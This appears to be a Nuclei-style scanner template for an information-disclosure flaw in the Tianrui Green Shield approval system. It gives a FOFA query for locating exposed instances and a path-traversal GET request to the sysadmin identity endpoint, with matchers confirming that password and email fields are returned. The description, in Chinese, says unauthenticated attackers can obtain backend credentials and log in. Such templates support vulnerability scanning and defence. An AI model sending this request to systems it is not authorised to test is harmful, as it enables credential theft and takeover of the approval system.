http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - '"id":'
            - '"lastName":'
            - '"email":'
            - '"password":'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
id: tianrui-sysadmin-Information-disclosure
info:
    author: Superhero
    description: |-
        fofa: app="TIPPAY-绿盾审批系统"
        天锐绿盾审批系统 sysadmin 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，从而登录后台，使系统处于极不安全的状态。
    name: 天锐绿盾审批系统 sysadmin 信息泄露漏洞
    reference:
        - https://mp.weixin.qq.com/s/sTSj5naBuBG1f6mOgqmWYg
    severity: medium
    tags:
        - Information disclosure
